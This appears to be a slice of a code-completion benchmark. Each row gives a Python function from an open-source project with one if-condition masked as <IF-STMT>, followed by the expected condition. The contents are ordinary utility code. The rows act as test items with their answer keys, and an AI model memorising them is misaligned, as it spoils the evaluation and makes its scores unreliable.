4696,"def _format_changelog(self, changelog):<tab>""""""Format the changelog correctly and convert it to a list of strings""""""<tab>if not changelog:<tab><tab>return changelog<tab>new_changelog = []<tab>for line in changelog.strip().split(""\n""):<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>new_changelog.extend(["""", line])<tab><tab>elif line[0] == ""-"":<tab><tab><tab>new_changelog.append(line)<tab><tab>else:<tab><tab><tab>new_changelog.append(""  "" + line)<tab># strip trailing newline inserted by first changelog entry<tab>if not new_changelog[0]:<tab><tab>del new_changelog[0]<tab>return new_changelog","if line [ 0 ] == ""*"" :",168
4697,"def __prep_write_total(self, comments, main, fallback, single):<tab>lower = self.as_lowercased()<tab>for k in [main, fallback, single]:<tab><tab>if k in comments:<tab><tab><tab>del comments[k]<tab>if single in lower:<tab><tab>parts = lower[single].split(""/"", 1)<tab><tab><IF-STMT><tab><tab><tab>comments[single] = [parts[0]]<tab><tab>if len(parts) > 1:<tab><tab><tab>comments[main] = [parts[1]]<tab>if main in lower:<tab><tab>comments[main] = lower.list(main)<tab>if fallback in lower:<tab><tab>if main in comments:<tab><tab><tab>comments[fallback] = lower.list(fallback)<tab><tab>else:<tab><tab><tab>comments[main] = lower.list(fallback)",if parts [ 0 ] :,196
4698,"def __str__(self):<tab>result = []<tab>for mask, quality in self._parsed:<tab><tab><IF-STMT><tab><tab><tab>mask = ""%s;q=%0.*f"" % (<tab><tab><tab><tab>mask,<tab><tab><tab><tab>min(len(str(quality).split(""."")[1]), 3),<tab><tab><tab><tab>quality,<tab><tab><tab>)<tab><tab>result.append(mask)<tab>return "", "".join(result)",if quality != 1 :,104
4699,"def allprocs(self):<tab>common.set_plugin_members(self)<tab>tasksaddr = self.addr_space.profile.get_symbol(""_tasks"")<tab>queue_entry = obj.Object(""queue_entry"", offset=tasksaddr, vm=self.addr_space)<tab>seen = [tasksaddr]<tab>for task in queue_entry.walk_list(list_head=tasksaddr):<tab><tab><IF-STMT><tab><tab><tab>proc = task.bsd_info.dereference_as(""proc"")<tab><tab><tab>yield proc<tab><tab>seen.append(task.obj_offset)",if task . bsd_info and task . obj_offset not in seen :,152
4700,"def __walk_dir_tree(self, dirname):<tab>dir_list = []<tab>self.__logger.debug(""__walk_dir_tree. START dir=%s"", dirname)<tab>for f in os.listdir(dirname):<tab><tab>current = os.path.join(dirname, f)<tab><tab>if os.path.isfile(current) and f.endswith(""py""):<tab><tab><tab>if self.module_registrant:<tab><tab><tab><tab>self._load_py_from_file(current)<tab><tab><tab>dir_list.append(current)<tab><tab><IF-STMT><tab><tab><tab>ret = self.__walk_dir_tree(current)<tab><tab><tab>if ret:<tab><tab><tab><tab>dir_list.append((f, ret))<tab>return dir_list",elif os . path . isdir ( current ) :,184
4701,"def get_code(self, address: Address) -> bytes:<tab>validate_canonical_address(address, title=""Storage Address"")<tab>code_hash = self.get_code_hash(address)<tab>if code_hash == EMPTY_SHA3:<tab><tab>return b""""<tab>else:<tab><tab>try:<tab><tab><tab>return self._journaldb[code_hash]<tab><tab>except KeyError:<tab><tab><tab>raise MissingBytecode(code_hash) from KeyError<tab><tab>finally:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._accessed_bytecodes.add(address)",if code_hash in self . _get_accessed_node_hashes ( ) :,150
4702,"def _strftime(value):<tab>if datetime:<tab><tab>if isinstance(value, datetime.datetime):<tab><tab><tab>return ""%04d%02d%02dT%02d:%02d:%02d"" % (<tab><tab><tab><tab>value.year,<tab><tab><tab><tab>value.month,<tab><tab><tab><tab>value.day,<tab><tab><tab><tab>value.hour,<tab><tab><tab><tab>value.minute,<tab><tab><tab><tab>value.second,<tab><tab><tab>)<tab>if not isinstance(value, (TupleType, time.struct_time)):<tab><tab><IF-STMT><tab><tab><tab>value = time.time()<tab><tab>value = time.localtime(value)<tab>return ""%04d%02d%02dT%02d:%02d:%02d"" % value[:6]",if value == 0 :,182
4703,"def _read_mol2_records(filename):<tab>lines = []<tab>start = True<tab>with open(filename) as handle:<tab><tab>for line in handle:<tab><tab><tab>if line.startswith(""@<TRIPOS>MOLECULE""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>start = False<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>yield lines<tab><tab><tab><tab><tab>lines = []<tab><tab><tab>lines.append(line)",if start :,109
4704,"def set_column_strategy(self, attrs, strategy, opts=None, opts_only=False):<tab>strategy = self._coerce_strat(strategy)<tab>self.is_class_strategy = False<tab>for attr in attrs:<tab><tab>cloned = self._generate()<tab><tab>cloned.strategy = strategy<tab><tab>cloned._generate_path(self.path, attr, ""column"")<tab><tab>cloned.propagate_to_loaders = True<tab><tab>if opts:<tab><tab><tab>cloned.local_opts.update(opts)<tab><tab><IF-STMT><tab><tab><tab>cloned.is_opts_only = True<tab><tab>cloned._set_path_strategy()<tab>self.is_class_strategy = False",if opts_only :,172
4705,"def decryptBlock(self, encryptedBlock):<tab>""""""Decrypt a single block""""""<tab>if self.decryptBlockCount == 0:  # first call, process IV<tab><tab><IF-STMT>  # auto decrypt IV?<tab><tab><tab>self.prior_CT_block = encryptedBlock<tab><tab><tab>return """"<tab><tab>else:<tab><tab><tab>assert len(self.iv) == self.blockSize, ""Bad IV size on CBC decryption""<tab><tab><tab>self.prior_CT_block = self.iv<tab>dct = self.baseCipher.decryptBlock(encryptedBlock)<tab>"""""" XOR the prior decrypted CT with the prior CT """"""<tab>dct_XOR_priorCT = xor(self.prior_CT_block, dct)<tab>self.prior_CT_block = encryptedBlock<tab>return dct_XOR_priorCT",if self . iv == None :,175
4706,"def frontend_visible_config(config_dict):<tab>visible_dict = {}<tab>for name in CLIENT_WHITELIST:<tab><tab>if name.lower().find(""secret"") >= 0:<tab><tab><tab>raise Exception(""Cannot whitelist secrets: %s"" % name)<tab><tab>if name in config_dict:<tab><tab><tab>visible_dict[name] = config_dict.get(name, None)<tab><tab><IF-STMT><tab><tab><tab>visible_dict[""BRANDING""] = visible_dict.get(""BRANDING"", {})<tab><tab><tab>visible_dict[""BRANDING""][""logo""] = config_dict[""ENTERPRISE_LOGO_URL""]<tab>return visible_dict","if ""ENTERPRISE_LOGO_URL"" in config_dict :",171
4707,"def write(self, s):<tab>if self.closed:<tab><tab>raise ValueError(""write to closed file"")<tab>if type(s) not in (unicode, str, bytearray):<tab><tab># See issue #19481<tab><tab>if isinstance(s, unicode):<tab><tab><tab>s = unicode.__getitem__(s, slice(None))<tab><tab>elif isinstance(s, str):<tab><tab><tab>s = str.__str__(s)<tab><tab><IF-STMT><tab><tab><tab>s = bytearray.__str__(s)<tab><tab>else:<tab><tab><tab>raise TypeError(""must be string, not "" + type(s).__name__)<tab>return self.shell.write(s, self.tags)","elif isinstance ( s , bytearray ) :",161
4708,"def __get_kb_shortcuts(directory, filename, default_shortcuts, min_shortcuts):<tab>shortcutstr, source = __read_first_in_directory_tree(directory, filename)<tab>if shortcutstr is None:<tab><tab>shortcutstr = __read_or_default(filename, default_shortcuts)<tab><tab><IF-STMT><tab><tab><tab>source = ""[default kb_shortcuts]""<tab><tab>else:<tab><tab><tab>source = filename<tab>kb_shortcuts = __parse_kb_shortcuts(shortcutstr, min_shortcuts, source)<tab>return kb_shortcuts",if shortcutstr == default_shortcuts :,133
4709,"def demo():<tab>d = StatusProgressDialog(""A Demo"", ""Doing something..."")<tab>import win32api<tab>for i in range(100):<tab><tab><IF-STMT><tab><tab><tab>d.SetText(""Getting there..."")<tab><tab>if i == 90:<tab><tab><tab>d.SetText(""Nearly done..."")<tab><tab>win32api.Sleep(20)<tab><tab>d.Tick()<tab>d.Close()",if i == 50 :,99
4710,"def __getattribute__(self, item):<tab>try:<tab><tab>val = self[item]<tab><tab>if isinstance(val, str):<tab><tab><tab>val = import_string(val)<tab><tab><IF-STMT><tab><tab><tab>val = [import_string(v) if isinstance(v, str) else v for v in val]<tab><tab>self[item] = val<tab>except KeyError:<tab><tab>val = super(ObjDict, self).__getattribute__(item)<tab>return val","elif isinstance ( val , ( list , tuple ) ) :",118
4711,"def clear(self, key: Optional[str] = None):<tab>with self.lock:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>rv = self.data[key]<tab><tab><tab><tab>self._heap_acc.remove((rv.acc, key))<tab><tab><tab><tab>self._heap_exp.remove((rv.exp, key))<tab><tab><tab><tab>del self.data[key]<tab><tab><tab><tab>return<tab><tab><tab>except Exception:<tab><tab><tab><tab>return<tab><tab>self.data.clear()<tab><tab>self._heap_acc = []<tab><tab>self._heap_exp = []",if key is not None :,148
4712,"def resolve(self, path):<tab>match = self.regex.search(path)<tab>if match:<tab><tab># If there are any named groups, use those as kwargs, ignoring<tab><tab># non-named groups. Otherwise, pass all non-named arguments as<tab><tab># positional arguments.<tab><tab>kwargs = match.groupdict()<tab><tab><IF-STMT><tab><tab><tab>args = ()<tab><tab>else:<tab><tab><tab>args = match.groups()<tab><tab># In both cases, pass any extra_kwargs as **kwargs.<tab><tab>kwargs.update(self.default_args)<tab><tab>return ResolverMatch(self.callback, args, kwargs, self.name)",if kwargs :,154
4713,"def check_selected(menu, path):<tab>selected = False<tab>if ""url"" in menu:<tab><tab>chop_index = menu[""url""].find(""?"")<tab><tab>if chop_index == -1:<tab><tab><tab>selected = path.startswith(menu[""url""])<tab><tab>else:<tab><tab><tab>selected = path.startswith(menu[""url""][:chop_index])<tab>if ""menus"" in menu:<tab><tab>for m in menu[""menus""]:<tab><tab><tab>_s = check_selected(m, path)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>selected = True<tab>if selected:<tab><tab>menu[""selected""] = True<tab>return selected",if _s :,153
4714,"def check_match(word, word_list):<tab>matches = set()<tab>not_matches = set()<tab>for word2 in word_list:<tab><tab>match = truncate_qgram(word, word2)<tab><tab><IF-STMT><tab><tab><tab>matches.add((word, word2))<tab><tab>else:<tab><tab><tab>not_matches.add((word, word2))<tab>return matches, not_matches",if match > 0.6 :,102
4715,"def _fatal_error(self, exc, message=""Fatal error on pipe transport""):<tab># should be called by exception handler only<tab>if isinstance(exc, (BrokenPipeError, ConnectionResetError)):<tab><tab><IF-STMT><tab><tab><tab>logger.debug(""%r: %s"", self, message, exc_info=True)<tab>else:<tab><tab>self._loop.call_exception_handler(<tab><tab><tab>{<tab><tab><tab><tab>""message"": message,<tab><tab><tab><tab>""exception"": exc,<tab><tab><tab><tab>""transport"": self,<tab><tab><tab><tab>""protocol"": self._protocol,<tab><tab><tab>}<tab><tab>)<tab>self._close(exc)",if self . _loop . get_debug ( ) :,158
4716,"def remove_existing_header(contents):<tab>""remove existing legal header, if any""<tab>retval = []<tab>skipping = False<tab>start_pattern = re.compile(r""^(/[*]BEGIN_LEGAL)|(#BEGIN_LEGAL)"")<tab>stop_pattern = re.compile(r""^[ ]*(END_LEGAL[ ]?[*]/)|(#[ ]*END_LEGAL)"")<tab>for line in contents:<tab><tab>if start_pattern.match(line):<tab><tab><tab>skipping = True<tab><tab>if skipping == False:<tab><tab><tab>retval.append(line)<tab><tab><IF-STMT><tab><tab><tab>skipping = False<tab>return retval",if stop_pattern . match ( line ) :,164
4717,"def load_model(self, model_dict):<tab>model_param = None<tab>model_meta = None<tab>for _, value in model_dict[""model""].items():<tab><tab>for model in value:<tab><tab><tab>if model.endswith(""Meta""):<tab><tab><tab><tab>model_meta = value[model]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>model_param = value[model]<tab>LOGGER.info(""load model"")<tab>self.set_model_meta(model_meta)<tab>self.set_model_param(model_param)<tab>self.loss = self.get_loss_function()","if model . endswith ( ""Param"" ) :",148
4718,"def __call__(self, exc_type, exc_value, exc_tb):<tab>if not isinstance(exc_value, SystemExit):<tab><tab>enriched_tb = add_missing_qt_frames(exc_tb) if exc_tb else exc_tb<tab><tab>for handler in self._handlers:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break","if handler . handle ( exc_type , exc_value , enriched_tb ) :",100
4719,"def skip_to_semicolon(s, i):<tab>n = len(s)<tab>while i < n:<tab><tab>c = s[i]<tab><tab>if c == "";"":<tab><tab><tab>return i<tab><tab>elif c == ""'"" or c == '""':<tab><tab><tab>i = g.skip_string(s, i)<tab><tab>elif g.match(s, i, ""//""):<tab><tab><tab>i = g.skip_to_end_of_line(s, i)<tab><tab><IF-STMT><tab><tab><tab>i = g.skip_block_comment(s, i)<tab><tab>else:<tab><tab><tab>i += 1<tab>return i","elif g . match ( s , i , ""/*"" ) :",161
4720,"def validate(self, signature, timestamp, nonce):<tab>if not self.token:<tab><tab>raise WeixinMsgError(""weixin token is missing"")<tab>if self.expires_in:<tab><tab>try:<tab><tab><tab>timestamp = int(timestamp)<tab><tab>except ValueError:<tab><tab><tab>return False<tab><tab>delta = time.time() - timestamp<tab><tab><IF-STMT><tab><tab><tab>return False<tab>values = [self.token, str(timestamp), str(nonce)]<tab>s = """".join(sorted(values))<tab>hsh = hashlib.sha1(s.encode(""utf-8"")).hexdigest()<tab>return signature == hsh",if delta < 0 or delta > self . expires_in :,161
4721,"def terminate(self):<tab>""""""Terminates process (sends SIGTERM)""""""<tab>if not self._proc is None:<tab><tab><IF-STMT><tab><tab><tab># Windows<tab><tab><tab>self._proc.terminate()<tab><tab>elif HAS_SUBPROCESS:<tab><tab><tab># Gio.Subprocess<tab><tab><tab>self._proc.send_signal(15)<tab><tab>else:<tab><tab><tab># subprocess.Popen<tab><tab><tab>self._proc.terminate()<tab><tab>self._proc = None<tab><tab>if IS_WINDOWS:<tab><tab><tab>self._stdout.close()<tab><tab>self._cancel.cancel()",if IS_WINDOWS :,141
4722,"def clear_bijector(bijector, _, state):<tab>if not isinstance(bijector, tfp.bijectors.Bijector):<tab><tab>return  # skip submodules that are not bijectors<tab>_clear_bijector_cache(bijector)<tab>if isinstance(bijector, tfp.bijectors.Chain):<tab><tab># recursively clear caches of sub-bijectors<tab><tab>for m in bijector.submodules:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_clear_bijector_cache(m)<tab>return state","if isinstance ( m , tfp . bijectors . Bijector ) :",148
4723,"def sanitize_args(a):<tab>try:<tab><tab>args, kwargs = a<tab><tab>if isinstance(args, tuple) and isinstance(kwargs, dict):<tab><tab><tab>return args, dict(kwargs)<tab>except (TypeError, ValueError):<tab><tab>args, kwargs = (), {}<tab>if a is not None:<tab><tab>if isinstance(a, dict):<tab><tab><tab>args = tuple()<tab><tab><tab>kwargs = a<tab><tab><IF-STMT><tab><tab><tab>if isinstance(a[-1], dict):<tab><tab><tab><tab>args, kwargs = a[0:-1], a[-1]<tab><tab><tab>else:<tab><tab><tab><tab>args = a<tab><tab><tab><tab>kwargs = {}<tab>return args, kwargs","elif isinstance ( a , tuple ) :",168
4724,"def do_DELE(self, path):<tab>""""""Delete the specified file.""""""<tab>try:<tab><tab>path = self.ftp_path(path)<tab><tab><IF-STMT><tab><tab><tab>self.respond(b""550 Failed to delete file."")<tab><tab>else:<tab><tab><tab>with self.config.vfs.check_access(path=path, user=self._uid, perms=""w""):<tab><tab><tab><tab>self.config.vfs.remove(path)<tab><tab><tab><tab>self.respond(b""250 File removed."")<tab>except FSOperationNotPermitted:<tab><tab>self.respond(b""500 Operation not permitted."")<tab>except (fs.errors.FSError, FilesystemError, FTPPrivilegeException):<tab><tab>self.respond(b""550 Failed to delete file."")",if not self . config . vfs . isfile ( path ) :,194
4725,"def _get_conn(self):<tab>""""""Get ServerProxy instance""""""<tab>if self.username and self.password:<tab><tab><IF-STMT><tab><tab><tab>raise NotImplementedError()<tab><tab>secure = self.scheme == ""https""<tab><tab>return self.sp(<tab><tab><tab>self.uri,<tab><tab><tab>transport=BasicAuthTransport(secure, self.username, self.password),<tab><tab><tab>**self.sp_kwargs<tab><tab>)<tab>return self.sp(self.uri, **self.sp_kwargs)","if self . scheme == ""scgi"" :",126
4726,"def output(self):<tab>""""""Transform self into a list of (name, value) tuples.""""""<tab>header_list = []<tab>for k, v in self.items():<tab><tab><IF-STMT><tab><tab><tab>k = self.encode(k)<tab><tab>if not isinstance(v, basestring):<tab><tab><tab>v = str(v)<tab><tab>if isinstance(v, unicodestr):<tab><tab><tab>v = self.encode(v)<tab><tab># See header_translate_* constants above.<tab><tab># Replace only if you really know what you're doing.<tab><tab>k = k.translate(header_translate_table, header_translate_deletechars)<tab><tab>v = v.translate(header_translate_table, header_translate_deletechars)<tab><tab>header_list.append((k, v))<tab>return header_list","if isinstance ( k , unicodestr ) :",197
4727,"def gprv_implicit_orax(ii):<tab>for i, op in enumerate(_gen_opnds(ii)):<tab><tab><IF-STMT><tab><tab><tab>if op.name == ""REG0"" and op_luf(op, ""GPRv_SB""):<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>elif i == 1:<tab><tab><tab>if op.name == ""REG1"" and op_luf(op, ""OrAX""):<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return False<tab>return True",if i == 0 :,151
4728,"def one_xmm_reg_imm8(ii):  # also allows SSE4 2-imm8 instr<tab>i, j, n = 0, 0, 0<tab>for op in _gen_opnds(ii):<tab><tab><IF-STMT><tab><tab><tab>n += 1<tab><tab>elif op_imm8(op):<tab><tab><tab>i += 1<tab><tab>elif op_imm8_2(op):<tab><tab><tab>j += 1<tab><tab>else:<tab><tab><tab>return False<tab>return n == 1 and i == 1 and j <= 1",if op_reg ( op ) and op_xmm ( op ) :,141
4729,"def pa(s, l, tokens):<tab>for attrName, attrValue in attrs:<tab><tab><IF-STMT><tab><tab><tab>raise ParseException(s, l, ""no matching attribute "" + attrName)<tab><tab>if attrValue != withAttribute.ANY_VALUE and tokens[attrName] != attrValue:<tab><tab><tab>raise ParseException(<tab><tab><tab><tab>s,<tab><tab><tab><tab>l,<tab><tab><tab><tab>""attribute '%s' has value '%s', must be '%s'""<tab><tab><tab><tab>% (attrName, tokens[attrName], attrValue),<tab><tab><tab>)",if attrName not in tokens :,140
4730,"def __code_color(self, code):<tab>if code in self.last_dist.keys():<tab><tab>if int(code) == 0:<tab><tab><tab>return self.screen.markup.GREEN<tab><tab><IF-STMT><tab><tab><tab>return self.screen.markup.MAGENTA<tab><tab>else:<tab><tab><tab>return self.screen.markup.RED<tab>else:<tab><tab>return """"",elif int ( code ) == 314 :,97
4731,"def loop_check(self):<tab>in_loop = []<tab># Add the tag for dfs check<tab>for node in self.nodes:<tab><tab>node.dfs_loop_status = ""DFS_UNCHECKED""<tab># Now do the job<tab>for node in self.nodes:<tab><tab># Run the dfs only if the node has not been already done */<tab><tab>if node.dfs_loop_status == ""DFS_UNCHECKED"":<tab><tab><tab>self.dfs_loop_search(node)<tab><tab># If LOOP_INSIDE, must be returned<tab><tab><IF-STMT><tab><tab><tab>in_loop.append(node)<tab># Remove the tag<tab>for node in self.nodes:<tab><tab>del node.dfs_loop_status<tab>return in_loop","if node . dfs_loop_status == ""DFS_LOOP_INSIDE"" :",199
4732,"def _append_modifier(code, modifier):<tab>if modifier == ""euro"":<tab><tab><IF-STMT><tab><tab><tab>return code + "".ISO8859-15""<tab><tab>_, _, encoding = code.partition(""."")<tab><tab>if encoding in (""ISO8859-15"", ""UTF-8""):<tab><tab><tab>return code<tab><tab>if encoding == ""ISO8859-1"":<tab><tab><tab>return _replace_encoding(code, ""ISO8859-15"")<tab>return code + ""@"" + modifier","if ""."" not in code :",115
4733,"def propagate_touch_to_touchable_widgets(self, touch, touch_event, *args):<tab>triggered = False<tab>for i in self._touchable_widgets:<tab><tab>if i.collide_point(touch.x, touch.y):<tab><tab><tab>triggered = True<tab><tab><tab><IF-STMT><tab><tab><tab><tab>i.on_touch_down(touch)<tab><tab><tab>elif touch_event == ""move"":<tab><tab><tab><tab>i.on_touch_move(touch, *args)<tab><tab><tab>elif touch_event == ""up"":<tab><tab><tab><tab>i.on_touch_up(touch)<tab>return triggered","if touch_event == ""down"" :",154
4734,"def body(self):<tab>order = [<tab><tab>""ok_header"",<tab><tab>""affected_rows"",<tab><tab>""last_insert_id"",<tab><tab>""server_status"",<tab><tab>""warning_count"",<tab><tab>""state_track"",<tab><tab>""info"",<tab>]<tab>string = b""""<tab>for key in order:<tab><tab>item = getattr(self, key)<tab><tab>section_pack = b""""<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif isinstance(item, bytes):<tab><tab><tab>section_pack = item<tab><tab>else:<tab><tab><tab>section_pack = getattr(self, key).toStringPacket()<tab><tab>string += section_pack<tab>self.setBody(string)<tab>return self._body",if item is None :,182
4735,"def get_opnd_types_short(ii):<tab>types = []<tab>for op in _gen_opnds(ii):<tab><tab>if op.oc2:<tab><tab><tab>types.append(op.oc2)<tab><tab>elif op_luf_start(op, ""GPRv""):<tab><tab><tab>types.append(""v"")<tab><tab><IF-STMT><tab><tab><tab>types.append(""z"")<tab><tab>elif op_luf_start(op, ""GPRy""):<tab><tab><tab>types.append(""y"")<tab><tab>else:<tab><tab><tab>die(""Unhandled op type {}"".format(op))<tab>return types","elif op_luf_start ( op , ""GPRz"" ) :",161
4736,"def load_name(self, name):<tab>if name in self.args:<tab><tab>index = self.args[name]<tab><tab><IF-STMT><tab><tab><tab>self.add_opcodes(JavaOpcodes.ALOAD_2(), java.Map.get(name))<tab><tab>else:<tab><tab><tab>self.add_opcodes(<tab><tab><tab><tab>JavaOpcodes.ALOAD_1(),<tab><tab><tab><tab>java.Array.get(index),<tab><tab><tab>)<tab>else:<tab><tab>self.add_opcodes(<tab><tab><tab>ALOAD_name(""#module""),<tab><tab><tab>python.Object.get_attribute(name),<tab><tab>)",if index is None :,157
4737,"def get_field_type(self, name):<tab>fkey = (name, self.dummy)<tab>target = None<tab>op, name = name.split(""_"", 1)<tab>if op in {""delete"", ""insert"", ""update""}:<tab><tab>target = super().get_field_type(name)<tab><tab>if target is None:<tab><tab><tab>module, edb_name = self.get_module_and_name(name)<tab><tab><tab>target = self.edb_schema.get((module, edb_name), None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>target = self.convert_edb_to_gql_type(target)<tab>self._fields[fkey] = target<tab>return target",if target is not None :,170
4738,"def _parse_lines(self, lines):<tab>for line in lines:<tab><tab>self.size += len(line)<tab><tab>words = line.strip().split(""\t"")<tab><tab><IF-STMT><tab><tab><tab>wset = set(words[1:])<tab><tab><tab>if words[0] in self.WORDS:<tab><tab><tab><tab>self.WORDS[words[0]] |= wset<tab><tab><tab>else:<tab><tab><tab><tab>self.WORDS[words[0]] = wset",if len ( words ) > 1 :,118
4739,"def get_new_id(self) -> str:<tab>with db.session.no_autoflush:<tab><tab>identifier = self.issued_at.strftime(""%Y%mU-"") + ""%06d"" % (<tab><tab><tab>EventInvoice.query.count() + 1<tab><tab>)<tab><tab>count = EventInvoice.query.filter_by(identifier=identifier).count()<tab><tab><IF-STMT><tab><tab><tab>return identifier<tab><tab>return self.get_new_id()",if count == 0 :,114
4740,"def complete_use(self, text, *args, **kwargs):<tab>if text:<tab><tab>all_possible_matches = filter(<tab><tab><tab>lambda x: x.startswith(text), self.main_modules_dirs<tab><tab>)<tab><tab>matches = set()<tab><tab>for match in all_possible_matches:<tab><tab><tab>head, sep, tail = match[len(text) :].partition(""."")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sep = """"<tab><tab><tab>matches.add("""".join((text, head, sep)))<tab><tab>return list(matches)<tab>else:<tab><tab>return self.main_modules_dirs",if not tail :,149
4741,"def get_arg_list_scalar_arg_dtypes(arg_types):<tab>result = []<tab>for arg_type in arg_types:<tab><tab>if isinstance(arg_type, ScalarArg):<tab><tab><tab>result.append(arg_type.dtype)<tab><tab><IF-STMT><tab><tab><tab>result.append(None)<tab><tab><tab>if arg_type.with_offset:<tab><tab><tab><tab>result.append(np.int64)<tab><tab>else:<tab><tab><tab>raise RuntimeError(""arg type not understood: %s"" % type(arg_type))<tab>return result","elif isinstance ( arg_type , VectorArg ) :",142
4742,"def psea(pname):<tab>""""""Parse PSEA output file.""""""<tab>fname = run_psea(pname)<tab>start = 0<tab>ss = """"<tab>with open(fname) as fp:<tab><tab>for l in fp:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>start = 1<tab><tab><tab><tab>continue<tab><tab><tab>if not start:<tab><tab><tab><tab>continue<tab><tab><tab>if l[0] == ""\n"":<tab><tab><tab><tab>break<tab><tab><tab>ss = ss + l[0:-1]<tab>return ss","if l [ 0 : 6 ] == "">p-sea"" :",142
4743,"def pad_with_zeros(logits, labels):<tab>""""""Pad labels on the length dimension to match logits length.""""""<tab>with tf.name_scope(""pad_with_zeros"", values=[logits, labels]):<tab><tab>logits, labels = pad_to_same_length(logits, labels)<tab><tab><IF-STMT>  # 2-d labels.<tab><tab><tab>logits, labels = pad_to_same_length(logits, labels, axis=2)<tab><tab>return logits, labels",if len ( labels . shape ) == 3 :,117
4744,"def set_rating(self, value, songs, librarian):<tab>count = len(songs)<tab>if count > 1 and config.getboolean(""browsers"", ""rating_confirm_multiple""):<tab><tab>parent = qltk.get_menu_item_top_parent(self)<tab><tab>dialog = ConfirmRateMultipleDialog(parent, _(""Change _Rating""), count, value)<tab><tab><IF-STMT><tab><tab><tab>return<tab>for song in songs:<tab><tab>song[""~#rating""] = value<tab>librarian.changed(songs)",if dialog . run ( ) != Gtk . ResponseType . YES :,134
4745,"def test_schema_plugin_name_mismatch(self):<tab># todo iterate over all clouds not just aws resources<tab>for k, v in manager.resources.items():<tab><tab>for fname, f in v.filter_registry.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>self.assertIn(fname, f.schema[""properties""][""type""][""enum""])<tab><tab>for aname, a in v.action_registry.items():<tab><tab><tab>self.assertIn(aname, a.schema[""properties""][""type""][""enum""])","if fname in ( ""or"" , ""and"" , ""not"" ) :",135
4746,"def run(self, elem):<tab>""""""Inline check for attrs at start of tail.""""""<tab>if elem.tail:<tab><tab>m = self.INLINE_RE.match(elem.tail)<tab><tab><IF-STMT><tab><tab><tab>self.assign_attrs(elem, m.group(1))<tab><tab><tab>elem.tail = elem.tail[m.end() :]",if m :,86
4747,"def _traverse(op):<tab>if topi.tag.is_broadcast(op.tag):<tab><tab>if not op.same_as(output.op):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>const_ops.append(op)<tab><tab><tab>else:<tab><tab><tab><tab>ewise_ops.append(op)<tab><tab>for tensor in op.input_tensors:<tab><tab><tab>if isinstance(tensor.op, tvm.te.PlaceholderOp):<tab><tab><tab><tab>ewise_inputs.append((op, tensor))<tab><tab><tab>else:<tab><tab><tab><tab>_traverse(tensor.op)<tab>else:<tab><tab>assert op.tag == ""dense_pack""<tab><tab>dense_res.append(op)",if not op . axis :,174
4748,"def toPostArgs(self):<tab>""""""Return all arguments with openid. in front of namespaced arguments.""""""<tab>args = {}<tab># Add namespace definitions to the output<tab>for ns_uri, alias in self.namespaces.iteritems():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if alias == NULL_NAMESPACE:<tab><tab><tab>ns_key = ""openid.ns""<tab><tab>else:<tab><tab><tab>ns_key = ""openid.ns."" + alias<tab><tab>args[ns_key] = ns_uri<tab>for (ns_uri, ns_key), value in self.args.iteritems():<tab><tab>key = self.getKey(ns_uri, ns_key)<tab><tab>args[key] = value.encode(""UTF-8"")<tab>return args",if self . namespaces . isImplicit ( ns_uri ) :,190
4749,"def test_issue_530_async(self):<tab>try:<tab><tab>rtm_client = RTMClient(token=""I am not a token"", run_async=True)<tab><tab>await rtm_client.start()<tab><tab>self.fail(""Raising an error here was expected"")<tab>except Exception as e:<tab><tab>self.assertEqual(<tab><tab><tab>""The request to the Slack API failed.\n""<tab><tab><tab>""The server responded with: {'ok': False, 'error': 'invalid_auth'}"",<tab><tab><tab>str(e),<tab><tab>)<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>rtm_client.stop()",if not rtm_client . _stopped :,163
4750,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.set_format(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.add_path(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,120
4751,"def _iterate_files(self, files, root, include_checksums, relpath):<tab>file_list = {}<tab>for file in files:<tab><tab>exclude = False<tab><tab># exclude defined filename patterns<tab><tab>for pattern in S3Sync.exclude_files:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>exclude = True<tab><tab><tab><tab>break<tab><tab>if not exclude:<tab><tab><tab>full_path = root + ""/"" + file<tab><tab><tab>if include_checksums:<tab><tab><tab><tab># get checksum<tab><tab><tab><tab>checksum = self._hash_file(full_path)<tab><tab><tab>else:<tab><tab><tab><tab>checksum = """"<tab><tab><tab>file_list[relpath + file] = [full_path, checksum]<tab>return file_list","if fnmatch . fnmatch ( file , pattern ) :",184
4752,"def globs_relative_to_buildroot(self):<tab>buildroot = get_buildroot()<tab>globs = []<tab>for bundle in self.bundles:<tab><tab>fileset = bundle.fileset<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif hasattr(fileset, ""filespec""):<tab><tab><tab>globs += bundle.fileset.filespec[""globs""]<tab><tab>else:<tab><tab><tab># NB(nh): filemap is an OrderedDict, so this ordering is stable.<tab><tab><tab>globs += [fast_relpath(f, buildroot) for f in bundle.filemap.keys()]<tab>super_globs = super().globs_relative_to_buildroot()<tab>if super_globs:<tab><tab>globs += super_globs[""globs""]<tab>return {""globs"": globs}",if fileset is None :,187
